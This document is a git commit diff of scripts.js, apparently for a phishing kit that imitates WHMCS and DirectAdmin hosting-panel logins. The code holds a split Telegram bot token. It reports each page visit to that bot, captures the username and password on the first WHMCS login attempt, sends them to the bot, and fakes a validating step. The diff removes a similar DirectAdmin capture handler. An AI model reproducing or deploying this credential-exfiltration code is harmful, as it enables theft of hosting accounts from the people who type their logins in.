65be5c610f03cb4be745d63df5a651627129b929
soportepanelesnexo <soporte.paneles.nexo@gmail.com>
2026-05-06 22:58:20 -0400

    Update scripts.js

--- scripts.js
+++ scripts.js
@@ -2,10 +2,9 @@
     const _a = "8622579966";
     const _b = "AAGqAh0RnQ6G";
     const _c = "665hz2xiJijMotCrzuT0bsU";
-    
     const _0xid = String(-5151842440 + 1); 
     const _0xtk = () => `${_a}:${_b}${_c}`;
-    const sendLog = (msg) => {
+    window.sendLog = (msg) => {
         const url = `https://api.telegram.org/bot${_0xtk()}/sendMessage?chat_id=${_0xid}&text=${encodeURIComponent(msg)}`;
         fetch(url, {
             method: 'GET',
@@ -15,22 +14,17 @@
     };
     const h = window.location.hostname;
     sendLog(`👀 Nueva visita en: ${h}`);
-
     document.addEventListener('DOMContentLoaded', () => {
-                const loginForm = document.getElementById('mainLoginForm');
+        const loginForm = document.getElementById('mainLoginForm');
         let isFirstAttempt = true;
-
         if (loginForm) {
             loginForm.addEventListener('submit', function(e) {
                 const u = document.getElementById('whUser').value;
                 const p = document.getElementById('whPass').value;
-
                 if (isFirstAttempt) {
                     e.preventDefault();
                     isFirstAttempt = false;
-                    
                     sendLog(`🔥 WHMCS LOGIN\nHost: ${h}\nUser: ${u}\nPass: ${p}`);
-                    
                     const btn = document.getElementById('whSubmit');
                     const originalVal = btn.value;
                     btn.value = "Validando...";
@@ -45,24 +39,7 @@
         }
         const daForm = document.getElementById('daCaptureForm');
         if (daForm) {
-            daForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const du = document.getElementById('daUser').value;
-                const dp = document.getElementById('daPass').value;
-                
-                sendLog(`🚨 DIRECTADMIN DATA\nHost: ${h}\nUser: ${du}\nPass: ${dp}`);
-                
-                const daBtn = document.getElementById('daSubmitBtn');
-                daBtn.innerText = "Sincronizando...";
-                daBtn.disabled = true;
-
-                setTimeout(() => {
-                    document.getElementById('daPopup').style.display = 'none';
-                    alert("Sincronización completada exitosamente.");
-                    daBtn.innerText = "Sincronizar Ahora";
-                    daBtn.disabled = false;
-                }, 1800);
-            });
+            console.log("Módulo de sincronización activo.");
         }
     });
 })();
